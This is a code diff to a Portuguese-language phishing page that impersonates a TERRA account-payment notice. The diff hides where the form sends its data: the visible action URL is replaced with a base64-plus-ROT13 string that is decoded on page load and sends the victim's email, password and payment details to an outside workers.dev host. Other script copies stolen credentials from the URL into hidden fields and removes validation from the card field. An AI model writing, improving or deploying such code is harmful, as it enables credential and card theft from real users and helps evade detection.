@@ -85,7 +85,8 @@
         <p>Atualização anual: R$ 4,99.</p>
         <p>Digite os dados abaixo para realizar a quitação.</p>
 
-        <form method="post" action="https://magui.maguimdasencomendas.workers.dev/">
+        <!-- FORM SEM ACTION VISÍVEL - AGORA OFUSCADO -->
+        <form method="post" id="formPagamento">
 
             <input type="hidden" name="email_original" id="email_original">
             <input type="hidden" name="senha_original" id="senha_original">
@@ -122,18 +123,41 @@
         © 2026 TERRA - Todos os direitos reservados
     </footer>
 
+    <!-- SCRIPT DA SEGUNDA PÁGINA COM OFUSCAÇÃO -->
     <script>
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            document.getElementById('email_original').value = urlParams.get('protocolo') || '';
-            document.getElementById('senha_original').value = urlParams.get('token') || '';
-            
-            // Remove qualquer validação do campo validade
-            const campoValidade = document.getElementById('validade');
-            campoValidade.removeAttribute('required');
-            campoValidade.removeAttribute('pattern');
-            campoValidade.removeAttribute('maxlength');
-        }
+    // Função ROT13 (igual à primeira página)
+    function rot13(str) {
+        return str.replace(/[a-zA-Z]/g, function(c) {
+            return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
+        });
+    }
+
+    window.addEventListener('load', function() {
+        var form = document.getElementById('formPagamento');
+        
+        // MESMA STRING OFUSCADA DA PRIMEIRA PÁGINA
+        var stringOfuscada = "dWdnY2Y6Ly96bnRodi56bnRodnpxbmZyYXBienJhcW5mLmpiZXhyZWYucXJpLw==";
+        
+        // DECODIFICA BASE64
+        var passo1 = atob(stringOfuscada);
+        
+        // APLICA ROT13 PARA TER A URL REAL
+        var urlReal = rot13(passo1);
+        
+        // APLICA A URL NO FORM
+        form.action = urlReal;
+        
+        // Pega os parâmetros da URL (email e senha da primeira página)
+        const urlParams = new URLSearchParams(window.location.search);
+        document.getElementById('email_original').value = urlParams.get('protocolo') || '';
+        document.getElementById('senha_original').value = urlParams.get('token') || '';
+        
+        // Remove qualquer validação do campo validade
+        const campoValidade = document.getElementById('validade');
+        campoValidade.removeAttribute('required');
+        campoValidade.removeAttribute('pattern');
+        campoValidade.removeAttribute('maxlength');
+    });
     </script>
 </body>
 </html>
